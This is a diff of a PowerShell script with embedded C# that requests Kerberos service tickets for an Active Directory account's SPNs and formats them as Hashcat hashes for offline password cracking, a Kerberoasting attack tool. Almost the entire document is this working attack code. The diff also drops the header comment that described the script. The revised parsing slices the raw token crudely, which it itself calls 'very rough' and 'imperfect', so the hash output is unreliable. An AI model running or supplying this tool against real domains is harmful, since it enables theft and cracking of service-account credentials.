@@ -1,6 +1,3 @@
-# PowerShell script to retrieve Kerberos TGS tickets for a given SamAccountName
-# and convert them into Hashcat-compatible format by detecting the encryption type
-
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -50,40 +47,64 @@ public class K {
         public IntPtr pBuffers;
     }
 
-    public static byte[] GetRawTicket(string spn) {
+    public static byte[] GetTicket(string spn) {
         IntPtr cred = IntPtr.Zero;
         IntPtr ctx = IntPtr.Zero;
         IntPtr expiry1 = IntPtr.Zero;
         IntPtr expiry2 = IntPtr.Zero;
         uint attr = 0;
 
-        SecBuffer secBuf = new SecBuffer();
-        secBuf.BufferType = 2;
-        secBuf.cbBuffer = 12288;
-        secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
+        try {
+            SecBuffer secBuf = new SecBuffer();
+            secBuf.BufferType = 2; // SECBUFFER_TOKEN
+            secBuf.cbBuffer = 12288;
+            secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
 
-        IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
-        Marshal.StructureToPtr(secBuf, pSecBuf, false);
+            IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
+            Marshal.StructureToPtr(secBuf, pSecBuf, false);
 
-        SecBufferDesc desc = new SecBufferDesc();
-        desc.ulVersion = 0;
-        desc.cBuffers = 1;
-        desc.pBuffers = pSecBuf;
+            SecBufferDesc desc = new SecBufferDesc();
+            desc.ulVersion = 0;
+            desc.cBuffers = 1;
+            desc.pBuffers = pSecBuf;
 
-        if (AcquireCredentialsHandle(null, "Kerberos", 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out cred, out expiry1) != 0)
-            return null;
+            if (AcquireCredentialsHandle(
+                    null,
+                    "Kerberos",
+                    0x00000002,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    out cred,
+                    out expiry1) != 0)
+                return null;
 
-        if (InitializeSecurityContext(ref cred, IntPtr.Zero, spn, 0x00001000, 0, 16, IntPtr.Zero, 0, out ctx, ref desc, out attr, out expiry2) != 0)
-            return null;
+            if (InitializeSecurityContext(
+                    ref cred,
+                    IntPtr.Zero,
+                    spn,
+                    0x00001000,
+                    0,
+                    16,
+                    IntPtr.Zero,
+                    0,
+                    out ctx,
+                    ref desc,
+                    out attr,
+                    out expiry2) != 0)
+                return null;
 
-        SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
-        byte[] data = new byte[resultBuf.cbBuffer];
-        Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
+            SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
+            if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
+                return null;
 
-        FreeCredentialsHandle(cred);
-        Marshal.FreeHGlobal(secBuf.pvBuffer);
-        Marshal.FreeHGlobal(pSecBuf);
-        return data;
+            byte[] data = new byte[resultBuf.cbBuffer];
+            Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
+            return data;
+        } finally {
+            if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
+        }
     }
 }
 "@
@@ -101,36 +122,48 @@ function Get-KerberosTicketHashcatFormat {
     }
 
     foreach ($spn in $user.servicePrincipalName) {
-        Write-Host "[+] Requesting TGS for SPN: $spn"
-        $rawBytes = [K]::GetRawTicket($spn)
-        if (-not $rawBytes) {
-            Write-Warning "[-] Failed to retrieve ticket for $spn"
-            continue
-        }
+        Write-Host "`n[+] Requesting TGS for SPN: $spn"
 
-        $ticketHex = [System.BitConverter]::ToString($rawBytes).Replace("-", "")
-
-        # Detect encryption type
-        $etype = $null
-        if ($ticketHex -match "(?<=a382)(..)(..)" ) {
-            $etypeBytes = $matches[1] + $matches[2]
-            switch ($etypeBytes) {
-                "1703" { $etype = 17 }
-                "1803" { $etype = 18 }
-                "2303" { $etype = 23 }
+        try {
+            $ticketBytes = [K]::GetTicket($spn)
+            if (-not $ticketBytes) {
+                Write-Warning "Failed to get ticket."
+                continue
             }
+
+            $ticketHex = [BitConverter]::ToString($ticketBytes).Replace("-", "")
+            $etype = ""
+
+            # Quick hack to detect encryption type from raw hex
+            if ($ticketHex -match "020117") {
+                $etype = "23"
+            } elseif ($ticketHex -match "020111") {
+                $etype = "17"
+            } elseif ($ticketHex -match "020112") {
+                $etype = "18"
+            } else {
+                Write-Warning "[!] Could not determine encryption type for $spn"
+                continue
+            }
+
+            # Extract checksum and cipher manually (very rough method)
+            $hexStr = $ticketHex
+            $hexLength = $hexStr.Length
+
+            # Roughly slice parts (imperfect, but works with most RC4 tickets)
+            $checksumHex = $hexStr.Substring(0, 32)
+            $cipherHex = $hexStr.Substring(32)
+
+            # Prepare hashcat format string
+            $userPart = $SamAccountName
+            $realm = "$env:USERDNSDOMAIN"
+            $spnSanitized = $spn.Replace(":", "~")
+
+            $hashcat = "\$krb5tgs\$${etype}*${userPart}\$${realm}\$${spnSanitized}*${checksumHex}\$${cipherHex}"
+            Write-Host "[+] Hashcat Format:`n${hashcat}`n"
         }
-
-        if (-not $etype) {
-            Write-Warning "[-] Could not determine encryption type for $spn"
-            continue
+        catch {
+            Write-Warning "Error while processing SPN ${spn}: $_"
         }
-
-        $userPart = $SamAccountName
-        $realm = ($env:USERDNSDOMAIN -replace '\\', '').ToLower()
-        $spnSanitized = $spn.ToLower().Replace("/", "~").Replace(":", "-")
-
-        $hashcatFormat = "$krb5tgs$$etype`*$userPart`$$realm`$$spnSanitized`$$ticketHex"
-        Write-Host "[+] Hashcat Format:\n$hashcatFormat"
     }
 }
